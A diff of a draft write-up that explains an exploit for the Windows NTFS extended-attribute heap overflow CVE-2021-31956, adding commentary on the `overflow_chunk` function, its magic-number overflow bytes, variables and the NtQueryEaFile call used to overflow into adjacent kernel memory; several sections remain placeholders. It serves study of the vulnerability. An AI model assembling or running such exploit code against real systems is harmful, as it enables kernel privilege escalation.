@@ -14,17 +14,26 @@ Thus, we will see the `overflow_chunk` using the `NtSetEaFile` syscall to create
 NTSTATUS overflow_chunk(_In_ USHORT overflow_chunk_sz, _In_ char *overflow_data, _In_ USHORT overflow_data_sz)
 ```
 
-PLACEHOLDER
+Before discussing the function definition for `overflow_chunk`, let's examine the values used when `overflow_chunk` is called in `main`: 
+
+```cpp
+//CVE-2021-31956.h
+#define OVERFLOW_DATA "\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00"
+#define OVERFLOW_SZ 0x18
+```
+
+The `overflow_chunk` function takes in three parameters: 
+
+* `overflow_chunk_sz`: A read-only unsigned short used as the `EaValueLength` value.
+* `overflow_data`: A read-only pointer to a character buffer containing the bytes that will overflow into the neighboring data structure. As observed with the `find_chunk` function, this data is set to a series of `0x5000` values used as a magic number. 
+* `overflow_data_sz`: A read-only unsigned short that specifies the size of the `memcopy` used to overflow the buffer.
+
+Now that we have defined how the input parameters are used by `overflow_chunk`, we will now discuss the variable definitions found in the function: 
 
 ```cpp
 NTSTATUS                    status = STATUS_SUCCESS;
 HANDLE                      file = INVALID_HANDLE_VALUE;
 IO_STATUS_BLOCK             x = { 0 };
-```
-
-PLACEHOLDER
-
-```cpp
 FILE_FULL_EA_INFORMATION    *fetched_data = zalloc(0x300);
 FILE_GET_EA_INFORMATION     *vuln_selector = zalloc(0x300);
 FILE_GET_EA_INFORMATION     *vuln_selector2;
@@ -32,10 +41,57 @@ FILE_FULL_EA_INFORMATION    *payload = zalloc(0x300);
 FILE_FULL_EA_INFORMATION    *overflow;
 ```
 
-PLACEHOLDER
+Let's now examine each variable in-depth: 
+
+* `status`: A variable returned after function execution of type `NTSTATUS` initialized to `STATUS_SUCCESS`.
+* `file`: A handle to the file whose Extended Attributes will be exploited.
+
+Before examining `x`, let's first review what an `IO_STATUS_BLOCK` datatype is. According to Microsoft, 
+
+> A driver sets an IRP's I/O status block to indicate the final status of an I/O request, before calling IoCompleteRequest for the IRP.
+
+Thus, with this in mind, `x` is first initialized to `0` from which its reference will be passed to both `NtSetEaFile` and `NtQueryEaFile`. 
+
+Let's now examine the `fetched_data` variable. According to NTInternals, 
+
+> `NtQueryEaFile` is used to read `EA` from `NTFS` file
+
+Let's examine the type definition for `NtQueryEaFile`'s function prototype Y3A used in `CVE-2021-31956.h`: 
 
 ```cpp
-file = CreateFileA("c:\\users\\chenl\\desktop\\ABC.txt",
+typedef NTSTATUS(*NQEF)(
+    HANDLE           FileHandle,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PVOID            Buffer,
+    ULONG            Length,
+    BOOLEAN          ReturnSingleEntry,
+    PVOID            EaList,
+    ULONG            EaListLength,
+    PULONG           EaIndex,
+    BOOLEAN          RestartScan
+    );
+```
+
+With this definition in mind, let's look to see how `fetched_data` is used in `overflow_chunk`: 
+
+```cpp
+NtQueryEaFile(file, &x, fetched_data, 0xaa, FALSE, vuln_selector, 0x300, NULL, TRUE);
+```
+
+We see `fetched_data` is a pointer to `Buffer`, were according to NTInternals, `Buffer` is defined as,
+
+> Caller's allocated buffer for output data.
+
+However, in the context of our exploit, we will not use `fetched_data` after it is called. The focus of the exploit is to use `NtQueryEaFile` to overflow into the next data structure in memory. 
+
+Let's now examine the variable `vuln_selector`. 
+
+* `vuln_selector2`: PLACEHOLDER
+* `payload`: PLACEHOLDER
+* `overflow`: PLACEHOLDER
+
+```cpp
+file = CreateFileA("c:\\users\\username\\desktop\\placeholder.txt",
     GENERIC_READ | GENERIC_WRITE,
     FILE_SHARE_READ | FILE_SHARE_WRITE,
     NULL,
